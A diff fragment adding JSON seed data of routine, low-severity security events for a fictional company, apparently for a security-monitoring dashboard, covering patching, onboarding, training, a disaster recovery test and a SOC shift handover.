+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-044",
+    "timestamp": "2025-02-17T19:30:10Z",
+    "severity": "LOW",
+    "title": "Antivirus definition update deployed",
+    "description": "Antivirus definition version 2025.0218.1 deployed to all endpoints via WSUS. 145 of 145 endpoints confirmed updated within 4-hour SLA. No new detections triggered by the updated signatures.",
+    "assetHostname": "wsus-01.penguwave.internal",
+    "assetIp": "10.0.1.40",
+    "sourceIp": "10.0.1.40",
+    "tags": [
+      "antivirus",
+      "update",
+      "maintenance"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-045",
+    "timestamp": "2025-02-18T15:25:18Z",
+    "severity": "LOW",
+    "title": "New user onboarded — standard provisioning",
+    "description": "New user account created for 'mwilliams@penguwave.io' (role: analyst, department: Security Operations). Standard access provisioned: VPN, email, SIEM read-only, ticketing system. Manager approval verified from 'jpark@penguwave.io'.",
+    "assetHostname": "iam-portal.penguwave.cloud",
+    "assetIp": "10.0.1.5",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "onboarding",
+      "iam",
+      "routine"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-046",
+    "timestamp": "2025-02-16T11:10:55Z",
+    "severity": "LOW",
+    "title": "Patch Tuesday updates applied — Windows Server fleet",
+    "description": "February 2025 Patch Tuesday updates applied to 28 Windows Server instances. All patches installed successfully with no reboot failures. Critical patches: KB5034763 (RCE fix), KB5034770 (privilege escalation fix). Next scan scheduled for 2025-02-25.",
+    "assetHostname": "wsus-01.penguwave.internal",
+    "assetIp": "10.0.1.40",
+    "sourceIp": "10.0.1.40",
+    "tags": [
+      "patching",
+      "windows",
+      "maintenance"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-047",
+    "timestamp": "2025-02-18T12:35:42Z",
+    "severity": "LOW",
+    "title": "Security awareness training — monthly completion report",
+    "description": "February security awareness training module 'Social Engineering Tactics' completed by 412 of 450 employees (91.6%). 38 employees have not yet completed the training (deadline: 2025-02-28). Reminder emails sent to non-completers.",
+    "assetHostname": "training.penguwave.cloud",
+    "assetIp": "10.0.1.55",
+    "sourceIp": "10.0.1.55",
+    "tags": [
+      "training",
+      "awareness",
+      "compliance"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-048",
+    "timestamp": "2025-02-17T13:45:30Z",
+    "severity": "LOW",
+    "title": "Network switch firmware updated — core-sw-01",
+    "description": "Core network switch core-sw-01 firmware updated from v7.2.1 to v7.3.0 during scheduled maintenance window. Update includes fixes for CVE-2024-12345 (LLDP buffer overflow). No service disruption reported. Rollback image preserved.",
+    "assetHostname": "core-sw-01.penguwave.internal",
+    "assetIp": "10.0.0.10",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "firmware",
+      "network",
+      "maintenance"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-049",
+    "timestamp": "2025-02-18T05:00:00Z",
+    "severity": "LOW",
+    "title": "Disaster recovery test — successful failover",
+    "description": "Quarterly DR test completed successfully. Primary database failover to DR site (us-west-2) completed in 4 minutes 12 seconds (RTO target: 15 minutes). Data loss: 0 transactions (RPO target: <1 minute). All application health checks passed post-failover.",
+    "assetHostname": "dr-controller.penguwave.cloud",
+    "assetIp": "10.1.1.5",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "disaster-recovery",
+      "failover",
+      "compliance"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-050",
+    "timestamp": "2025-02-17T08:30:00Z",
+    "severity": "LOW",
+    "title": "SOC shift handover — night to day",
+    "description": "SOC shift handover completed at 08:30 UTC. Night shift (analyst2) handed over 3 open investigations to day shift (analyst1): EVT-003 (Tor connection), EVT-007 (PowerShell reverse shell), EVT-012 (data exfiltration). No critical incidents pending immediate action.",
+    "assetHostname": "soc-portal.penguwave.internal",
+    "assetIp": "10.0.1.70",
+    "sourceIp": "10.0.1.70",
+    "tags": [
+      "soc",
+      "shift-handover",
+      "routine"
+    ],
+    "userId": "usr-002"
+  }
+]
